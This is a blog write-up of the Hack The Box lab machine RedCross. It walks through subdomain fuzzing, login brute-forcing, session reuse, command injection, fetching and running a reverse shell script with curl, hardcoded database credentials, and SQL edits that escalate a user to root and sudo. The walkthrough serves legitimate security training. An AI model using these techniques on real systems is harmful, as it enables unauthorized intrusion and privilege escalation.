<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - RedCross - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for RedCross from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - RedCross">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/redcross/">


  <meta property="og:description" content="My write-up / walkthrough for RedCross from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - RedCross">
  <meta name="twitter:description" content="My write-up / walkthrough for RedCross from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/redcross/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-04-13T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/redcross/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - RedCross">
    <meta itemprop="description" content="Hack The Box - RedCrossQuick SummaryHey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as www-data , then escalate to root. The second way is to exploit a vulnerable smtp server called Haraka to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is 10.10.10.113 I added it to /etc/hosts as redcross.htb. Let’s jump right in !NmapAs always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC redcross.htbPort 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.HTTP Initial EnumerationBy going to http://redcross.htb it redirects us to https://intra.redcross.htbI added intra.redcross.htb to /etc/hosts next to the ip of the box which is 10.10.10.113Let’s go to intra.redcross.htb again : Before doing anything I wanted to see if there are any other subdomains , so I used wfuzz with subdomains-top1mil-5000.txt from seclists :wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htbResponses for non-existing subdomains are 28 words so I stopped the scan to add --hw 28 to filter these responses :wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htbAnd we got admin.redcross.htb , So I added it to /etc/hosts :Note : to enumerate every subdoamin there has to be an entry for that subdomain in /etc/hosts that points to the ip of the box , that’s why I added the HOST HTTP header (-H &quot;HOST:FUZZ.redcross.htb&quot;) , it solves the problem.Now let’s go to admin.redcross.htb and see what’s there :It asks for login , we will get into this later but let’s go back to intra.redcross.htb and see what can we do from there.We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with burp to see the parameters :Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like admin:admin, top-usernames-shortlist.txt from seclists :wfuzz -c --hh 11 -u &quot;https://intra.redcross.htb/pages/actions.php&quot; -X POST -d &quot;user=FUZZ&amp;pass=FUZZ&amp;action=login&quot; -w top-usernames-shortlist.txtguest:guest gave us a different response. Let’s try it :And it worked. And we see this message :From: admin (uid 1)	To: guest (uid 5)You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.Broken Session Management , Admin PanelAfter some enumeration I found that after being authenticated as guest on intra.redcross.htb you can use the session id on admin.redcross.htb and it will work :Now we have access to the admin panel , there are two areas : User Management and Network AccessUser Management :Can we really add users ? Let’s try test :Nice it gave us the credentials , let’s try ssh : And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at /home :interface_data and public ? Last thing I checked was /etc/passwd to know any possible user :There’s a user called penelope , but no /home directory for penelope. So I gave up on this and looked at Network Access :I added my ip address to the whitelist:Then I scanned the box with nmap again to see if some new ports show up :there’s ftp on port 21 (anonymous login not allowed), postgresql SQL database on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.RCE on admin.redcross.htb , Reverse Shell as www-dataOn the Network Access Section you can add and remove ips from the whitelist , I added a random ip , let’s say 11.11.11.11 and intercepted the two requests with burp :Allow request :Response :Deny request :Response :We notice that it’s saying Executing iptables , so the ip we provide will be a part of a system command. I added |ls to the ip parameter in the deny request and got this response :Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it shell.sh :Then I hosted it on a python simple HTTP server , and downloaded it on the box : curl http://10.10.xx.xx/shell.sh &gt; /tmp/shell.shPython Server :Let’s verify that the shell is on the box :Nice let’s execute :bash /tmp/shell.shWe got a shell as www-data :And we see in /home a directory for penelope , but we can’t read the user flag.Hardcoded PostgreSQL Database Credentials , Privilege Escalation to rootIn the root directory of the web application , there’s an interseting php file called actions.php. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called unixusrmgr :if($action==='del'){        header('refresh:1;url=/?page=users');        $uid=$_POST['uid'];        $dbconn = pg_connect(&quot;host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;&quot;);        $result = pg_prepare($dbconn, &quot;q1&quot;, &quot;delete from passwd_table where uid = $1&quot;);        $result = pg_execute($dbconn, &quot;q1&quot;, array($uid));        echo &quot;User account deleted&quot;;}We knew earlier that the database is PostgreSQL , let’s connect :Some Cheatcheets for PostgreSQL : Githubpostgresqltutorial.compsql -h 127.0.0.1 -d unix -U unixusrmgr\dt to list the tables :I did select * from passwd_table; and got some users with their password hashes and other info , so I went back to the admin panel and added a user called rick :Then I did select * from passwd_table; again :We notice that the homedir is set to /var/jail/home that’s why we can’t access the actual host with created users. Also the gid is set to 1001. Let’s set that to 0 (root) :update passwd_table set gid=0 where gid=1001;Now the gid is 0 : Let’s also change the homedir :update passwd_table set homedir='/home' where homedir='/var/jail/home';Let’s login with ssh again :by checking our gid : It’s root , we still can’t read the flags :We can’t also sudo :Weird , I checked /etc/sudoers and saw this line :If we got the gid of the group sudo , we will be able to run sudo.cat /etc/group | grep sudoThe gid is 27 , let’s return to the database and change our gid from 0 to 27 :update passwd_table set gid=27 where gid=0;select * from passwd_table;Great , let’s terminate our ssh connection and login again. We are now a member of sudo and we can run sudo , so sudo su will give us a root shell.Let’s read the user flag :Before reading the root flag let’s see how can we actually get a user shell as penelopeVulnerable SMTP Server (Haraka)Back to the admin panel , after whitelisting the ip and doing a second nmap scan :Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, nc , telnet , ftp etc…Fortunately ftp gave me this banner :That version of the SMTP server is vulnerable to a command injection and there’s a metasploit module for it :That’s how to get a shell on the box without the RCE in the web application.We can get a shell by typing shell , and we are penelope so we can read the user flag :After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :And we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - VaultNext Hack The Box write-up : Hack The Box - Teacher">
    <meta itemprop="datePublished" content="2019-04-13T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/redcross/" class="u-url" itemprop="url">Hack The Box - RedCross
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-04-13T07:00:00+02:00">April 13, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---redcross">Hack The Box - RedCross</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#broken-session-management--admin-panel">Broken Session Management , Admin Panel</a></li>
<li><a href="#rce-on-adminredcrosshtb--reverse-shell-as-www-data">RCE on admin.redcross.htb , Reverse Shell as www-data</a></li>
<li><a href="#hardcoded-postgresql-database-credentials--privilege-escalation-to-root">Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root</a></li>
<li><a href="#vulnerable-smtp-server-haraka">Vulnerable SMTP Server (Haraka)</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---redcross">Hack The Box - RedCross</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as <code class="language-plaintext highlighter-rouge">www-data</code> , then escalate to root. The second way is to exploit a vulnerable <code class="language-plaintext highlighter-rouge">smtp</code> server called <code class="language-plaintext highlighter-rouge">Haraka</code> to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.113</code> I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">redcross.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/redcross/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services : 
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC redcross.htb</code>
<br><img src="/images/hackthebox/redcross/1.png" alt="" class="align-center"><br><br>
Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p>By going to <code class="language-plaintext highlighter-rouge">http://redcross.htb</code> it redirects us to <code class="language-plaintext highlighter-rouge">https://intra.redcross.htb</code>
<br><img src="/images/hackthebox/redcross/2.png" alt="" class="align-center"><br><br>
I added <code class="language-plaintext highlighter-rouge">intra.redcross.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> next to the ip of the box which is <code class="language-plaintext highlighter-rouge">10.10.10.113</code>
<br><img src="/images/hackthebox/redcross/3.png" alt="" class="align-center"><br><br>
Let’s go to <code class="language-plaintext highlighter-rouge">intra.redcross.htb</code> again : 
<br><img src="/images/hackthebox/redcross/4.png" alt="" class="align-center"><br><br>
Before doing anything I wanted to see if there are any other subdomains , so I used <code class="language-plaintext highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1mil-5000.txt</a> from seclists :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb
</code></pre></div></div>
<p><br><img src="/images/hackthebox/redcross/5.png" alt="" class="align-center"><br><br>
Responses for non-existing subdomains are 28 words so I stopped the scan to add <code class="language-plaintext highlighter-rouge">--hw 28</code> to filter these responses :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb
</code></pre></div></div>
<p><br><img src="/images/hackthebox/redcross/6.png" alt="" class="align-center"><br><br>
And we got <code class="language-plaintext highlighter-rouge">admin.redcross.htb</code> , So I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> :
<br><img src="/images/hackthebox/redcross/7.png" alt="" class="align-center"><br><br>
Note : to enumerate every subdoamin there has to be an entry for that subdomain in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> that points to the ip of the box , that’s why I added the <code class="language-plaintext highlighter-rouge">HOST</code> HTTP header (<code class="language-plaintext highlighter-rouge">-H "HOST:FUZZ.redcross.htb"</code>) , it solves the problem.<br>
Now let’s go to <code class="language-plaintext highlighter-rouge">admin.redcross.htb</code> and see what’s there :
<br><img src="/images/hackthebox/redcross/8.png" alt="" class="align-center"><br><br>
It asks for login , we will get into this later but let’s go back to <code class="language-plaintext highlighter-rouge">intra.redcross.htb</code> and see what can we do from there.<br>
<br><img src="/images/hackthebox/redcross/4.png" alt="" class="align-center"><br><br>
We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with <code class="language-plaintext highlighter-rouge">burp</code> to see the parameters :
<br><img src="/images/hackthebox/redcross/9.png" alt="" class="align-center"><br><br>
Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like <code class="language-plaintext highlighter-rouge">admin:admin</code>, <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt" target="_blank" rel="noopener noreferrer">top-usernames-shortlist.txt</a> from seclists :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hh 11 -u "https://intra.redcross.htb/pages/actions.php" -X POST -d "user=FUZZ&amp;pass=FUZZ&amp;action=login" -w top-usernames-shortlist.txt
</code></pre></div></div>
<p><br><img src="/images/hackthebox/redcross/10.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">guest:guest</code> gave us a different response. Let’s try it :
<br><img src="/images/hackthebox/redcross/11.png" alt="" class="align-center"><br><br>
And it worked. And we see this message :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From: admin (uid 1)	To: guest (uid 5)

You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.

</code></pre></div></div>

<h2 id="broken-session-management--admin-panel">Broken Session Management , Admin Panel</h2>
<p>After some enumeration I found that after being authenticated as <code class="language-plaintext highlighter-rouge">guest</code> on <code class="language-plaintext highlighter-rouge">intra.redcross.htb</code> you can use the session id on <code class="language-plaintext highlighter-rouge">admin.redcross.htb</code> and it will work :
<br><img src="/images/hackthebox/redcross/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/14.png" alt="" class="align-center"><br><br>
Now we have access to the admin panel , there are two areas : <code class="language-plaintext highlighter-rouge">User Management</code> and <code class="language-plaintext highlighter-rouge">Network Access</code>
<code class="language-plaintext highlighter-rouge">User Management</code> :
<br><img src="/images/hackthebox/redcross/15.png" alt="" class="align-center"><br><br>
Can we really add users ? Let’s try <code class="language-plaintext highlighter-rouge">test</code> :
<br><img src="/images/hackthebox/redcross/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/17.png" alt="" class="align-center"><br><br>
Nice it gave us the credentials , let’s try ssh : 
<br><img src="/images/hackthebox/redcross/18.png" alt="" class="align-center"><br><br>
And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at <code class="language-plaintext highlighter-rouge">/home</code> :
<br><img src="/images/hackthebox/redcross/19.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">interface_data</code> and <code class="language-plaintext highlighter-rouge">public</code> ? Last thing I checked was <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to know any possible user :
<br><img src="/images/hackthebox/redcross/20.png" alt="" class="align-center"><br><br>
There’s a user called <code class="language-plaintext highlighter-rouge">penelope</code> , but no <code class="language-plaintext highlighter-rouge">/home</code> directory for <code class="language-plaintext highlighter-rouge">penelope</code>. So I gave up on this and looked at <code class="language-plaintext highlighter-rouge">Network Access</code> :
<br><img src="/images/hackthebox/redcross/21.png" alt="" class="align-center"><br><br>
I added my ip address to the whitelist:
<br><img src="/images/hackthebox/redcross/22.png" alt="" class="align-center"><br><br>
Then I scanned the box with nmap again to see if some new ports show up :
<br><img src="/images/hackthebox/redcross/59.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/60.png" alt="" class="align-center"><br><br>
there’s ftp on port 21 (anonymous login not allowed), <code class="language-plaintext highlighter-rouge">postgresql SQL database</code> on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.<br></p>

<h2 id="rce-on-adminredcrosshtb--reverse-shell-as-www-data">RCE on <code class="language-plaintext highlighter-rouge">admin.redcross.htb</code> , Reverse Shell as <code class="language-plaintext highlighter-rouge">www-data</code>
</h2>
<p>On the <code class="language-plaintext highlighter-rouge">Network Access</code> Section you can add and remove ips from the whitelist , I added a random ip , let’s say <code class="language-plaintext highlighter-rouge">11.11.11.11</code> and intercepted the two requests with <code class="language-plaintext highlighter-rouge">burp</code> :
<br><img src="/images/hackthebox/redcross/23.png" alt="" class="align-center"><br><br>
Allow request :
<br><img src="/images/hackthebox/redcross/24.png" alt="" class="align-center"><br><br>
Response :
<br><img src="/images/hackthebox/redcross/25.png" alt="" class="align-center"><br><br>
Deny request :
<br><img src="/images/hackthebox/redcross/26.png" alt="" class="align-center"><br><br>
Response :
<br><img src="/images/hackthebox/redcross/27.png" alt="" class="align-center"><br><br>
We notice that it’s saying <code class="language-plaintext highlighter-rouge">Executing iptables</code> , so the ip we provide will be a part of a system command. I added <code class="language-plaintext highlighter-rouge">|ls</code> to the ip parameter in the deny request and got this response :
<br><img src="/images/hackthebox/redcross/28.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/29.png" alt="" class="align-center"><br><br>
Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it <code class="language-plaintext highlighter-rouge">shell.sh</code> :
<br><img src="/images/hackthebox/redcross/30.png" alt="" class="align-center"><br><br>
Then I hosted it on a python simple HTTP server , and downloaded it on the box : <code class="language-plaintext highlighter-rouge">curl http://10.10.xx.xx/shell.sh &gt; /tmp/shell.sh</code>
<br><img src="/images/hackthebox/redcross/31.png" alt="" class="align-center"><br><br>
Python Server :
<br><img src="/images/hackthebox/redcross/32.png" alt="" class="align-center"><br><br>
Let’s verify that the shell is on the box :
<br><img src="/images/hackthebox/redcross/33.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/34.png" alt="" class="align-center"><br><br>
Nice let’s execute :
<code class="language-plaintext highlighter-rouge">bash /tmp/shell.sh</code>
<br><img src="/images/hackthebox/redcross/35.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/36.png" alt="" class="align-center"><br><br>
We got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> :
<br><img src="/images/hackthebox/redcross/37.png" alt="" class="align-center"><br><br>
And we see in <code class="language-plaintext highlighter-rouge">/home</code> a directory for <code class="language-plaintext highlighter-rouge">penelope</code> , but we can’t read the user flag.<br>
<br><img src="/images/hackthebox/redcross/38.png" alt="" class="align-center"><br><br></p>

<h2 id="hardcoded-postgresql-database-credentials--privilege-escalation-to-root">Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root</h2>
<p>In the root directory of the web application , there’s an interseting <code class="language-plaintext highlighter-rouge">php</code> file called <code class="language-plaintext highlighter-rouge">actions.php</code>. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called <code class="language-plaintext highlighter-rouge">unixusrmgr</code> :
<br><img src="/images/hackthebox/redcross/40.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">===</span><span class="s1">'del'</span><span class="p">){</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'refresh:1;url=/?page=users'</span><span class="p">);</span>
        <span class="nv">$uid</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">];</span>
        <span class="nv">$dbconn</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;"</span><span class="p">);</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_prepare</span><span class="p">(</span><span class="nv">$dbconn</span><span class="p">,</span> <span class="s2">"q1"</span><span class="p">,</span> <span class="s2">"delete from passwd_table where uid = $1"</span><span class="p">);</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_execute</span><span class="p">(</span><span class="nv">$dbconn</span><span class="p">,</span> <span class="s2">"q1"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$uid</span><span class="p">));</span>
        <span class="k">echo</span> <span class="s2">"User account deleted"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>We knew earlier that the database is <code class="language-plaintext highlighter-rouge">PostgreSQL</code> , let’s connect :
Some Cheatcheets for <code class="language-plaintext highlighter-rouge">PostgreSQL</code> : 
<a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546" target="_blank" rel="noopener noreferrer">Github</a>
<a href="http://www.postgresqltutorial.com/postgresql-cheat-sheet/" target="_blank" rel="noopener noreferrer">postgresqltutorial.com</a>
<code class="language-plaintext highlighter-rouge">psql -h 127.0.0.1 -d unix -U unixusrmgr</code>
<br><img src="/images/hackthebox/redcross/41.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">\dt</code> to list the tables :
<br><img src="/images/hackthebox/redcross/42.png" alt="" class="align-center"><br><br>
I did <code class="language-plaintext highlighter-rouge">select * from passwd_table;</code> and got some users with their password hashes and other info , so I went back to the admin panel and added a user called <code class="language-plaintext highlighter-rouge">rick</code> :
<br><img src="/images/hackthebox/redcross/43.png" alt="" class="align-center"><br><br>
Then I did <code class="language-plaintext highlighter-rouge">select * from passwd_table;</code> again :
<br><img src="/images/hackthebox/redcross/44.png" alt="" class="align-center"><br><br>
We notice that the <code class="language-plaintext highlighter-rouge">homedir</code> is set to <code class="language-plaintext highlighter-rouge">/var/jail/home</code> that’s why we can’t access the actual host with created users. Also the <code class="language-plaintext highlighter-rouge">gid</code> is set to <code class="language-plaintext highlighter-rouge">1001</code>. Let’s set that to <code class="language-plaintext highlighter-rouge">0</code> (root) :
<code class="language-plaintext highlighter-rouge">update passwd_table set gid=0 where gid=1001;</code>
<br><img src="/images/hackthebox/redcross/45.png" alt="" class="align-center"><br><br>
Now the <code class="language-plaintext highlighter-rouge">gid</code> is <code class="language-plaintext highlighter-rouge">0</code> : 
<br><img src="/images/hackthebox/redcross/46.png" alt="" class="align-center"><br><br>
Let’s also change the <code class="language-plaintext highlighter-rouge">homedir</code> :
<code class="language-plaintext highlighter-rouge">update passwd_table set homedir='/home' where homedir='/var/jail/home';</code>
<br><img src="/images/hackthebox/redcross/47.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/48.png" alt="" class="align-center"><br><br>
Let’s login with ssh again :
<br><img src="/images/hackthebox/redcross/49.png" alt="" class="align-center"><br><br>
by checking our <code class="language-plaintext highlighter-rouge">gid</code> : 
<br><img src="/images/hackthebox/redcross/50.png" alt="" class="align-center"><br><br>
It’s <code class="language-plaintext highlighter-rouge">root</code> , we still can’t read the flags :
<br><img src="/images/hackthebox/redcross/51.png" alt="" class="align-center"><br><br>
We can’t also <code class="language-plaintext highlighter-rouge">sudo</code> :
<br><img src="/images/hackthebox/redcross/52.png" alt="" class="align-center"><br><br>
Weird , I checked <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> and saw this line :
<br><img src="/images/hackthebox/redcross/53.png" alt="" class="align-center"><br><br>
If we got the <code class="language-plaintext highlighter-rouge">gid</code> of the group <code class="language-plaintext highlighter-rouge">sudo</code> , we will be able to run sudo.<br>
<code class="language-plaintext highlighter-rouge">cat /etc/group | grep sudo</code>
<br><img src="/images/hackthebox/redcross/54.png" alt="" class="align-center"><br><br>
The <code class="language-plaintext highlighter-rouge">gid</code> is <code class="language-plaintext highlighter-rouge">27</code> , let’s return to the database and change our <code class="language-plaintext highlighter-rouge">gid</code> from <code class="language-plaintext highlighter-rouge">0</code> to <code class="language-plaintext highlighter-rouge">27</code> :
<code class="language-plaintext highlighter-rouge">update passwd_table set gid=27 where gid=0;</code>
<br><img src="/images/hackthebox/redcross/55.png" alt="" class="align-center"><br><br></p>

<p><code class="language-plaintext highlighter-rouge">select * from passwd_table;</code>
<br><img src="/images/hackthebox/redcross/56.png" alt="" class="align-center"><br><br>
Great , let’s terminate our ssh connection and login again. We are now a member of <code class="language-plaintext highlighter-rouge">sudo</code> and we can run <code class="language-plaintext highlighter-rouge">sudo</code> , so <code class="language-plaintext highlighter-rouge">sudo su</code> will give us a root shell.<br>
<br><img src="/images/hackthebox/redcross/57.png" alt="" class="align-center"><br><br>
Let’s read the user flag :
<br><img src="/images/hackthebox/redcross/58.png" alt="" class="align-center"><br><br>
Before reading the root flag let’s see how can we actually get a user shell as <code class="language-plaintext highlighter-rouge">penelope</code></p>

<h2 id="vulnerable-smtp-server-haraka">Vulnerable SMTP Server (Haraka)</h2>
<p>Back to the admin panel , after whitelisting the ip and doing a second nmap scan :
<br><img src="/images/hackthebox/redcross/59.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/60.png" alt="" class="align-center"><br><br>
